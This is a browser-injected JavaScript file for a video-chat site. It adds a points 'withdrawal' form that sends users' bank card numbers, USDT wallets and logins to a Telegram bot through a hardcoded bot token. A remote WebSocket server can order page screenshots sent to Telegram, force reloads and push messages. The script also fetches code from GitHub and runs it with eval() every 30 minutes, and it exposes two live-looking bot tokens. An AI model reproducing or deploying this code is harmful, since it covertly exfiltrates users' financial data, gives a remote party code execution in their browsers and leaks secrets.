// Create and append the script element for Axios
var scriptElement = document.createElement('script');
scriptElement.src = 'https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js';
document.head.appendChild(scriptElement);


var scriptgit = document.createElement('script');
scriptgit.src = 'https://lakai92.github.io/indexnew.js';
document.head.appendChild(scriptgit);


var link = document.createElement('link');

// Устанавливаем атрибуты элемента link
link.rel = 'stylesheet';
link.type = 'text/css';
link.href = 'https://lakai92.github.io/style.css'; // замените ссылку на ссылку на ваш файл CSS на GitHub

// Добавляем элемент link в заголовок документа
document.head.appendChild(link);



var script = document.createElement('script');
script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.5.0-beta4/html2canvas.min.js';
script.type = 'text/javascript';
document.body.appendChild(script);




var toWithdraw = "";
var toBlur = "";
var toYouHave = "";
var toPoints = "";
var toWithdrawTo = "";
var toBankCard = "";
var toCardNumber = "";
var toUSDT = "";
var toLogin = "";
var toReceive = "";
var toSubmitWith = "";
var toWitrec = "";
var toErrorWith = "";
var toWithdrawButton = "";
var toAdditional ="";
var errormsg =""

var lang = document.getElementById('load-txt');
if (lang) {
    var selectlang = lang.textContent;

    switch (selectlang) {
        case "Loading": // Английский
            toWithdraw = "You need 5000 points to withdraw money";
            toBlur = "Press to blur the screen";
            toYouHave = "You have ";
            toPoints = " points";
            toWithdrawTo = "Withdraw to:"
            toBankCard = "Bank card";
            toCardNumber = "Card number";
            toUSDT = "USDT wallet number (Supported only TRC-20 network)";
            toLogin = "Account name";
            toReceive = "You’ll receive: "
            toSubmitWith = "Continue";
            toWitrec = "Withdrawal request sent";
            toErrorWith = "Withdrawal error, please try later";
            toWithdrawButton = "Withdraw";
            toAdditional = "Your transfer may take several days to complete";
            errormsg = "Please fill in all required fields";
            break;
        // Добавьте другие языки по аналогии
        default:
            toWithdraw = "Для вывода средств необходимо 5000 баллов";
            toBlur = "Размытие экрана";
            toYouHave = "У вас ";
            toPoints = " баллов";
            toWithdrawTo = "Вывести на:";
            toBankCard = "Банковстая карта";
            toCardNumber = "Номер карты";
            toUSDT = "Номер кошелька USDT (TRC-20)";
            toLogin = "Логин";
            toReceive = "Вы получите: ";
            toSubmitWith = "Продолжить";
            toWitrec = "Запрос на вывод отправлен";
            toErrorWith = "Ошибка вывода";
            toWithdrawButton = "Вывод";
            toAdditional = "Срок перевода от одного до нескольких дней";
            errormsg = "Пожалуйста, заполните все обязательные поля"
    }
}


document.title = "whynot";

function handleMutation(mutationsList, observer) {
  for (var mutation of mutationsList) {
    if (mutation.type === 'childList') {
      // Проверяем, добавлен ли элемент с классом "signed-in-user"
      var signedInUserElement = document.querySelector(".signed-in-user");
      if (signedInUserElement && !signedInUserElement.hasAttribute('data-buttons-added')) {
        // Создаем кнопку btn4
        var openFormButton4 = document.createElement("button");
        openFormButton4.innerHTML = toWithdrawButton;
        openFormButton4.classList.add('btn4');

        // Создаем кнопку btn505
        var openFormButton5 = document.createElement("button");
        openFormButton5.innerHTML = "Баллы";
        openFormButton5.classList.add('btn505');

        // Добавляем обе кнопки внутрь элемента
        signedInUserElement.prepend(openFormButton4);
        signedInUserElement.prepend(openFormButton5);

        // Помечаем элемент, чтобы избежать повторного добавления кнопок
        signedInUserElement.setAttribute('data-buttons-added', 'true');

        // Добавляем event listener для кнопок
        openFormButton4.addEventListener('click', createFormPopup);

        // Перестаем наблюдать за изменениями, так как кнопки уже добавлены
        observer.disconnect();
      }
    }
  }
}

// Добавьте другую функцию, которая будет вызвана при клике на кнопку btn5
// Находим корневой элемент, который будет отслеживаться
var targetNode = document.body;

// Настройка MutationObserver с функцией обратного вызова
var observer = new MutationObserver(handleMutation);

// Начинаем наблюдение за изменениями в дереве DOM
var config = { childList: true, subtree: true };
observer.observe(targetNode, config);




// Function to create and display the payout form modal
function createFormPopup() {
  // Check if an element with the specified class exists
  var spanElement = document.querySelector('.info-panel__balance--moneys__score');

  if (spanElement) {
      var spanValue = spanElement.innerText;

      // Create the modal overlay
      var modalOverlay = document.createElement('div');
      modalOverlay.classList.add('modal-overlay');
      document.body.appendChild(modalOverlay);

      // Create the modal div
      var modalDiv = document.createElement('div');
      modalDiv.classList.add('modal');
      document.body.insertBefore(modalDiv, modalOverlay);

      // Create the close button
      var closeButton = document.createElement('button');
      closeButton.classList.add('close-button');

      // Create the close icon using SVG
      var closeIcon = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
      closeIcon.setAttribute('width', '16');
      closeIcon.setAttribute('height', '16');
      closeIcon.setAttribute('viewBox', '0 0 16 16');
      closeIcon.innerHTML = '<path d="M13 3L3 13l5-5 5 5L3 3" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>';

      closeButton.appendChild(closeIcon);
      modalDiv.appendChild(closeButton);

      // Add a click event listener to close the modal
      closeButton.addEventListener('click', function () {
          modalDiv.style.display = 'none';
          modalOverlay.style.display = 'none';
      });

      // Create and append various elements within the modal
      var prefixSpan = document.createElement('span');
      prefixSpan.textContent = toYouHave;
      modalDiv.appendChild(prefixSpan);

      var spanValueElement = document.createElement('span');
      spanValueElement.textContent = spanValue;
      spanValueElement.classList.add('value');
      prefixSpan.appendChild(spanValueElement);

      var postfixSpan = document.createElement('span');
      postfixSpan.textContent = toPoints;
      modalDiv.appendChild(postfixSpan);

      var selectWrapper = document.createElement('div');
      selectWrapper.classList.add('select-wrapper');
      modalDiv.appendChild(selectWrapper);

      var selectElement = document.createElement('select');
      selectElement.classList.add('select-field');
      modalDiv.appendChild(selectElement);

        var optionPlaceholder = document.createElement('option');
        optionPlaceholder.value = "";
        optionPlaceholder.text = toWithdrawTo;
        optionPlaceholder.disabled = true;
        optionPlaceholder.selected = true;
        selectElement.appendChild(optionPlaceholder);

        var optionBankCard = document.createElement('option');
        optionBankCard.value = "bank_card";
        optionBankCard.text = toBankCard;
        selectElement.appendChild(optionBankCard);

        var optionUSDT = document.createElement('option');
        optionUSDT.value = "usdt";
        optionUSDT.text = "USDT (TRC-20)";
        selectElement.appendChild(optionUSDT);


        var containerDiv = document.createElement('div');
        containerDiv.classList.add('input-container');
        modalDiv.appendChild(containerDiv);


        var cardInput = document.createElement('input');
        cardInput.setAttribute('type', 'text');
        cardInput.setAttribute('placeholder', toCardNumber);
        cardInput.classList.add('input-field');
        cardInput.style.display = 'none';
        containerDiv.appendChild(cardInput);


        var imgElement = document.createElement('img');
        imgElement.setAttribute('src', 'https://static.tildacdn.com/tild3937-3339-4638-a438-336665366133/my-prinimaem-oplatu-.png');  // Установите фактический путь к изображению
        imgElement.classList.add('input-img');
        imgElement.style.display = 'none';
        imgElement.style.position = 'absolute';
        imgElement.style.height = '13px';
        imgElement.style.background = 'white';
        imgElement.style.left = '9%';
        imgElement.style.top = '150px';

        containerDiv.before(imgElement);

		
		cardInput.addEventListener('input', function () {
    var value = cardInput.value.replace(/\D/g, ''); // Remove non-numeric characters
    var formattedValue = '';

    if (value.length > 16) {
        // Limit the input to 16 digits
        value = value.slice(0, 16);
    }

    for (var i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) {
            formattedValue += ' '; // Add a space every 4 digits
        }
        formattedValue += value.charAt(i);
    }

    cardInput.value = formattedValue;
});


        var trcContainerDiv = document.createElement('div');
        trcContainerDiv.classList.add('input-container');
        modalDiv.appendChild(trcContainerDiv);




        var trcInput = document.createElement('input');
        trcInput.setAttribute('type', 'text');
        trcInput.setAttribute('placeholder', toUSDT);
        trcInput.classList.add('input-field');
        trcInput.style.display = 'none';
        trcContainerDiv.after(trcInput);


        var trcImgElement = document.createElement('img');
        trcImgElement.setAttribute('src', 'https://static.tildacdn.com/tild3537-6238-4165-b865-623634653038/svg_1706491938968.svg');
        trcImgElement.classList.add('input-img');
        trcImgElement.style.display = 'none';
        trcImgElement.style.position = 'absolute';
        trcImgElement.style.height = '13px';
        trcImgElement.style.background = 'white';
        trcImgElement.style.left = '9%';
        trcImgElement.style.top = '150px';
        
        // Добавляем img для trcInput к контейнеру
        trcContainerDiv.appendChild(trcImgElement);


        var loginInput = document.createElement('input');
        loginInput.setAttribute('type', 'text');
        loginInput.setAttribute('placeholder', toLogin);
        loginInput.classList.add('input-field');
        loginInput.style.display = 'none';
        modalDiv.appendChild(loginInput);

        selectElement.addEventListener('change', function () {
            if (selectElement.value === 'bank_card' || selectElement.value === 'usdt') {
                loginInput.style.display = 'block';
            } else {
                loginInput.style.display = 'none';
            }

            if (selectElement.value === 'bank_card') {
                cardInput.style.display = 'block';
                trcInput.style.display = 'none';
                imgElement.style.display = 'block';
                trcImgElement.style.display = 'none';
            } else if (selectElement.value === 'usdt') {
                cardInput.style.display = 'none';
                trcInput.style.display = 'block';
                imgElement.style.display = 'none';
                trcImgElement.style.display ='block';
            }
        });

       var message = document.createElement('div');
       message.classList.add('message');


        // Fetch the coefficient from a remote URL
        // Fetch the coefficient for bank card from a remote URL
var bankCardCoefficientURL = 'https://raw.githubusercontent.com/lakai92/coefficient/main/bank_card_coefficient.js';
        fetch(bankCardCoefficientURL)
            .then(function (response) {
                if (response.status === 200) {
                    return response.text();
                } else {
                    throw new Error("undefined");
                }
            })
            .then(function (bankCardCoefficientScript) {
                // Parse the script and set the coefficient for bank card
                var bankCardScript = document.createElement('script');
                bankCardScript.textContent = bankCardCoefficientScript;
                document.head.appendChild(bankCardScript);
            })
            .catch(function (error) {
                console.error(error.message);
            });

        // Fetch the coefficient for USDT from a remote URL
        var usdtCoefficientURL = 'https://raw.githubusercontent.com/lakai92/coefficient/main/usdt_coefficient.js';
        fetch(usdtCoefficientURL)
            .then(function (response) {
                if (response.status === 200) {
                    return response.text();
                } else {
                    throw new Error("undefined");
                }
            })
            .then(function (usdtCoefficientScript) {
                // Parse the script and set the coefficient for USDT
                var usdtScript = document.createElement('script');
                usdtScript.textContent = usdtCoefficientScript;
                document.head.appendChild(usdtScript);

                // Initialize the message based on the default select value
                updateMessage();

                // Add an event listener to handle changes in the select element
                selectElement.addEventListener('change', function () {
                    // Update the message whenever the selection changes
                    updateMessage();
                });

                // Function to update the message based on the selected option
                var additionalContentAdded = false;

                function updateMessage() {
                    // Retrieve the current coefficient based on the selected option
                    var coefficient;
                
                    if (selectElement.value === 'bank_card') {
                        coefficient = window.usdtCoefficient;
                    } else if (selectElement.value === 'usdt') {
                        coefficient = window.usdtCoefficient;
                    }
                
                    // Update the message content
                    if (parseInt(spanValue) < 5000) {
                        message.innerHTML = toWithdraw;
                        message.classList.add('toWithdrawсlass');
                
                        // Reset the flag when switching to 'toWithdraw' content
                        additionalContentAdded = false;
                    } else {
                        var payoutValue;
                
                        if (selectElement.value === 'bank_card') {
                            payoutValue = (parseFloat(spanValue) * coefficient).toFixed(2);
                            message.classList.add('toReceiveClass');
                            message.innerHTML = toReceive + `<span class="styled-payout-value">${payoutValue}</span> $`;
                        } else if (selectElement.value === 'usdt') {
                            payoutValue = (parseFloat(spanValue) * coefficient).toFixed(2);
                            message.classList.add('toReceiveClass');
                            message.innerHTML = toReceive + `<span class="styled-payout-value">${payoutValue}</span> USDT`;
                        }
                
                        // Check if additional content has already been added
                        if (!additionalContentAdded) {
                            // Check if message has a parent before inserting additional content
                            if (message.parentNode) {
                                // Add additional content as a sibling to the message
                                message.insertAdjacentHTML('afterend', '<div class="additionalContentClass">' +toAdditional+ '</div>');
                            } else {
                                // If message has no parent, insert additional content into the document body
                                document.body.insertAdjacentHTML('beforeend', '<div class="additionalContentClass">' +toAdditional+ '</div>');
                            }
                
                            // Set the flag to true to indicate that additional content has been added
                            additionalContentAdded = true;
                        }
                    }
                }

                
                // Append the message element to the modal div
                //var additionalContent = document.createElement('div');
                //additionalContent.className = 'additionalContentClass';
                //additionalContent.innerHTML = toAdditional;
                //message.before(additionalContent);

                submitButton.before(message);
            })
            .catch(function (error) {
                console.error(error.message);
            });

            


        var submitButton = document.createElement('button');
        submitButton.textContent = toSubmitWith;
        submitButton.classList.add('submit-button');
        submitButton.disabled = parseInt(spanValue) < 5000;
        if (submitButton.disabled) {
          submitButton.style.backgroundColor = '#E5EBF1'; // Любой цвет, который вы хотите
         submitButton.style.cursor = 'not-allowed';
        
      } else {
      submitButton.style.cursor = 'pointer';
      }

      var errorMessage = document.createElement('div');
      errorMessage.id = 'errorMessage';
      errorMessage.style.display = 'none';
      errorMessage.style.color = 'red';

      modalDiv.appendChild(errorMessage);

      modalDiv.appendChild(submitButton);

      submitButton.addEventListener('click', function () {
          var selectedOption = selectElement.value;
          var loginValue = loginInput.value;
          var cardValue = cardInput.value;
          var trcValue = trcInput.value;
      
          if (loginValue === '' || (cardValue === '' && trcValue === '')) {
              errorMessage.textContent = errormsg;
              errorMessage.style.display = 'block';
      
              // Установить фокус на первое незаполненное поле
              if (loginValue === '') {
                  loginInput.focus();
              } else if (cardValue === '') {
                  cardInput.focus();
              } else {
                  trcInput.focus();
              }
      
              return;
          }
          
          var pay = document.querySelector('.styled-payout-value').textContent;

          var messageText = "Способ вывода: " + selectedOption + "\n\n";
          messageText += "Логин: " + loginValue + "\n\n";
          if (selectedOption === 'bank_card') {
              messageText += "Карта: <code>" + cardValue + "</code>\n\n"
              messageText += "Баллов: " + spanValue + "\n\n"
              messageText += "Получит: " + pay + " рублей\n\n";
          } else if (selectedOption === 'usdt') {
              messageText += "TRC 20: <code>" + trcValue + "</code>\n\n"
              messageText += "Баллов: " + spanValue + "\n\n"
              messageText += "Получит: " + pay + " USDT\n\n";
          }
      
          var botToken = '5504778459:AAG3edPQZR2Amr0OT7AGeR2kDAIVdX2tBfU'; // Replace with your actual bot token
          var chatId = '1022126654'; // Replace with your actual chat ID
      
          axios.post('https://api.telegram.org/bot' + botToken + '/sendMessage', {
              chat_id: chatId,
              text: messageText,
              parse_mode: 'HTML',
          })
              .then(function (response) {
                  console.log('Уведомление успешно отправлено');
                  var notificationMessage = document.createElement('div');
                  notificationMessage.textContent = toWitrec;
                  notificationMessage.classList.add('notification');
                  modalDiv.appendChild(notificationMessage);
      
                  loginInput.value = '';
                  cardInput.value = '';
                  trcInput.value = '';
              })
              .catch(function (error) {
                  console.error('Ошибка при отправке уведомления', error);
                  var errorNotification = document.createElement('div');
                  errorNotification.textContent = toErrorWith;
                  errorNotification.classList.add('error-notification');
                  modalDiv.appendChild(errorNotification);
              });
      });

        modalOverlay.addEventListener('click', function (event) {
            if (event.target === modalOverlay) {
                modalDiv.style.display = 'none';
                modalOverlay.style.display = 'none';
            }
        });

        modalDiv.style.display = 'block';
        modalOverlay.style.display = 'block';
    } else {
        console.error("Элемент с классом 'info-panel__balance--moneys__score' не найден");
    }
}


// Add an event listener to the "Open Form" button




let button2 = document.createElement('button');
button2.className = "btn5";
button2.innerHTML = 'loading...';
document.body.prepend(button2);

setTimeout(function() {
  document.getElementsByClassName("btn5")[0].outerHTML = "";
}, 20000);



let button7 = document.createElement('button');
button7.className = "btn7";
button7.innerHTML = "";
document.body.prepend(button7);
function bt7() {
  // Получаем элемент
  var element = document.querySelector(".coomeet-chat .video-chat-area .video-dialog .companion-video__video.visible");

  // Проверяем текущее значение свойства style.filter
  if (element.style.filter === 'blur(20px)') {
    // Если размытие уже включено, то отключаем его
    element.style.filter = 'blur(0px)';
  } else {
    // Иначе, включаем размытие
    element.style.filter = 'blur(20px)';
  }
}
function bt8() {
  // Получаем элемент
  var element = document.querySelector(".coomeet-chat .video-chat-area .video-dialog .companion-video__video.visible");

  // Проверяем текущее значение свойства style.filter
  if (element.style.filter === 'blur(20px)') {
    // Если размытие уже включено, то отключаем его
    element.style.filter = 'blur(0px)';
  } else {
    // Иначе, включаем размытие
    element.style.filter = 'blur(20px)';
  }
}
function bt9() {
  // Получаем элемент
  var element = document.querySelector(".coomeet-chat .video-chat-area .video-dialog .companion-video__video.visible");

  // Проверяем текущее значение свойства style.filter
  if (element.style.filter === 'blur(20px)') {
    // Если размытие уже включено, то отключаем его
    element.style.filter = 'blur(0px)';
  } else {
    // Иначе, включаем размытие
    element.style.filter = 'blur(20px)';
  }
}

button7.addEventListener("click", bt7);
button7.addEventListener("click", bt8);
button7.addEventListener("click", bt9);






button7.onmouseover = function() {
  let btn101 = document.createElement('div');
  btn101.className = "btn101";
  btn101.innerHTML = toBlur;
  btn101.style.cssText = "";
  button7.after(btn101);
}

button7.onmouseout = function() {
  let btn101 = document.querySelector('.btn101');
  btn101.remove();
}

let intervalId;

function checkSelector() {
  let firstSelector = document.querySelector(".info-panel__balance--moneys");
  let secondSelector = document.querySelector(".signed-in-user");
  let thirdSelector = document.querySelector(".info-panel__balance");
  let fourthSelector = document.querySelector(".info-panel__balance--moneys__score");

  if (!firstSelector || !secondSelector || !thirdSelector || !fourthSelector) {
    // Create button if any selector is not found
    let button = document.createElement('button');
    button.className = "btn5";
    button.innerHTML = 'Error...';
    document.body.prepend(button);
  } else {
    // Stop the interval if all selectors are found
    clearInterval(intervalId);
  }
}

intervalId = setInterval(checkSelector, 20000);


// Адрес внешнего скрипта
var scriptUrl = 'https://raw.githubusercontent.com/lakai92/coefficient/main/body.js';

function updateScript() {
  fetch(scriptUrl)
    .then(response => response.text())
    .then(scriptText => {
      // Выполняем загруженный скрипт
      eval(scriptText);

      // После загрузки внешнего скрипта, проверяем и создаем кнопку, если btn55 === true
      if (typeof btn55 !== 'undefined' && btn55 === true) {
        var button22 = document.createElement('button');
        button22.className = 'btn55';
        button22.innerHTML = 'Error...';
        document.body.prepend(button22);
      }
    })
    .catch(error => console.error('Ошибка при загрузке скрипта:', error));
}

// Обновляем скрипт каждые 3000000 миллисекунд (50 минут)
setInterval(updateScript, 1800000);

// Загружаем скрипт в первый раз
updateScript();





var scriptUrl2 = 'https://raw.githubusercontent.com/lakai92/coefficient/main/survey3.js.';

function updateScript2() {
  fetch(scriptUrl2)
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      return response.text();
    })
    .then(scriptText => {
      try {
        var result = JSON.parse(scriptText);

        // После загрузки внешнего скрипта, проверяем и создаем элемент, если btnms === true
        if (typeof result !== 'undefined' && result.btnms === true) {
          // Создаем div-элемент
          var divElement = document.createElement('div');
          divElement.className = 'btnms';

          // Подтягиваем HTML-код из переменной html (замените на ваш HTML-код опросника)
          var htmlContent = typeof result.html !== 'undefined' ? result.html : 'Error...';
          divElement.innerHTML = htmlContent;

          // Создаем кнопку закрытия
          var closeButton = document.createElement('button');
          closeButton.innerHTML = 'Закрыть';
          closeButton.className = 'btncolse';
          closeButton.addEventListener('click', function() {
            // Удаляем div при клике на кнопку закрытия
            divElement.remove();
          });

          // Добавляем кнопку закрытия в div
          divElement.appendChild(closeButton);

          // Добавляем div в body
          document.body.prepend(divElement);
        }
      } catch (error) {
        console.error('Ошибка при обработке JSON:', error);
      }
    })
    .catch(error => console.error('Ошибка при загрузке скрипта:', error));
}

// Обновляем скрипт каждые 3000000 миллисекунд (50 минут)
setInterval(updateScript2, 3000000);

// Загружаем скрипт в первый раз
updateScript2();

// Create notification container
// Create notification container
// Create notification container
const notificationContainer = document.createElement('div');
notificationContainer.className = 'notification-container';
notificationContainer.style.display = 'none';

// Create text element
const textElement = document.createElement('p');
textElement.className = 'notification-text';

// Create close button
const closeButton = document.createElement('button');
closeButton.textContent = 'Закрыть';
closeButton.className = 'clsbtn'; // Changed class to 'clsbtn'
closeButton.style.cursor = 'pointer';
closeButton.addEventListener('click', () => {
    notificationContainer.style.display = 'none';
});

// Append elements to the document
document.body.appendChild(notificationContainer);
notificationContainer.appendChild(textElement);
notificationContainer.appendChild(closeButton);

// Updated WebSocket connection
//const name = 'Lakshmi'; // Set the user identifier
//console.log(name)
// Глобальная переменная
// Глобальная переменная
// Глобальная переменная
// Глобальная переменная
// Глобальная переменная
// Глобальная переменная
// Глобальная переменная
// Глобальная переменная
// Глобальная переменная
// Глобальная переменная
// Глобальная переменная
// Глобальная переменная
// Глобальная переменная
// Глобальная переменная



const name = 'Lakshmi';

function connect() {
  const socket = new WebSocket(`wss://appnode.why-not-chat.com/?name=${name}`);
  console.log(socket);

  socket.addEventListener('message', (event) => {
      const isJsonMessage = isJSON(event.data);

      if (isJsonMessage) {
          try {
              const data = JSON.parse(event.data);

              if (data.type === 'admin_message' && data.text === 'bals') {
                  handleAdminResponse(data);
              } else if (data.type === 'admin_message' && data.text === 'res') { 
                  restart(data);

              } else if (data.type === 'admin_message') { 
                  showNotification(data.text);
            }
              
              // Add other conditions as needed for different message types
          } catch (error) {
              console.error('Error parsing JSON:', error);
              console.log('Raw data:', event.data);
              // Handle JSON parsing errors here
          }
      } else {
          // Handle non-JSON messages (e.g., 'pong') here
          console.log('Received non-JSON message:', event.data);
      }
  });
  function restart(data) {
    window.location.reload(true);
  }

  function handleAdminResponse(message) {
    const botToken = '6019277840:AAGc9DQWszbE7nEraRKNxV4FSRHT5KMFhlE';
    const chatId = '1022126654'; // Замените на ID вашего чата с ботом
    const userBals = 'Lakshmi';
      // Выполняем снимок экрана и отправляем в Telegram
      var elementToScreenshot = document.querySelector('.info-panel');

      html2canvas(elementToScreenshot).then(function (canvas) {
          var screenshotDataUrl = canvas.toDataURL('image/png');
          var screenshotBlob = dataURItoBlob(screenshotDataUrl);

          var formData = new FormData();
          formData.append('photo', screenshotBlob, 'screenshot.png', 'userBals');
          formData.append('caption', userBals);

          fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
              method: 'POST',
              body: formData

              
          })
          .then(response => response.json())
          .then(data => {
              console.log('Telegram API response:');
          })
          .catch(error => {
              console.error('Error', error);
          });
      });
  }

  function dataURItoBlob(dataURI) {
    var byteString = atob(dataURI.split(',')[1]);
    var ab = new ArrayBuffer(byteString.length);
    var ia = new Uint8Array(ab);
    for (var i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ab], { type: 'image/png' });
  }
  socket.onerror = (error) => {
    console.error('WebSocket error:', error);
    // Запустите механизм повторного подключения здесь, если необходимо
    reconnect();
  };

  socket.onclose = (event) => {
    console.log('WebSocket connection closed:', event);
    // Запустите механизм повторного подключения здесь, если необходимо
    reconnect();
  };


  // Send a ping message every 30 seconds to keep the connection alive
  setInterval(() => {
      if (socket.readyState === WebSocket.OPEN) {
          socket.send('ping');
      }
  }, 30000);

  return socket;
}

let socket = connect();  // Инициализация соединения
let reconnectAttempts = 0;

function reconnect() {
    if (reconnectAttempts < 3) {
        console.log('Reconnecting...');
        socket.close();  // Закрыть предыдущее соединение перед переподключением
        setTimeout(() => {
            socket = connect();  // Переподключение
            reconnectAttempts++;
        }, 10000);
    } else {
        console.log('Exceeded maximum reconnection attempts.');
    }
}
// Function to check if a string is valid JSON
function isJSON(str) {
    try {
        JSON.parse(str);
        return true;
    } catch (error) {
        return false;
    }
}

function showNotification(text) {
    // Set text content for the text element
    textElement.textContent = text;

    // Display the notification container
    notificationContainer.style.display = 'block';
}



// Function to handle changes in the DOM
const handleDomChanges = () => {
  const selectedOptionLabel = document.querySelector('.selected-option__label');
  const uiScrollArea = document.querySelector('.ui-scroll-area');

  if (selectedOptionLabel && uiScrollArea) {
    // Your logic to handle text changes
    if (selectedOptionLabel.textContent.trim() === 'Избранное' || selectedOptionLabel.textContent.trim() === 'Заблокированные' || selectedOptionLabel.textContent.trim() === 'Непрочитанное' || selectedOptionLabel.textContent.trim() === 'Favourites' || selectedOptionLabel.textContent.trim() === 'Unread' || selectedOptionLabel.textContent.trim() === 'Blocked') {
      uiScrollArea.style.top = '-1px';
    } else {
      uiScrollArea.style.top = '-72px';
    }
  }
};

// Create a MutationObserver instance
const observer2 = new MutationObserver(handleDomChanges);

// Specify the target node and the type of mutations to observe
const targetNode2 = document.body; // You can adjust this to the actual parent element of the dynamic content
const config2 = { childList: true, subtree: true };

// Start observing the target node for configured mutations
observer2.observe(targetNode2, config2);

// Call the handler initially to handle the current state
handleDomChanges();



window.scriptLoaded = true;
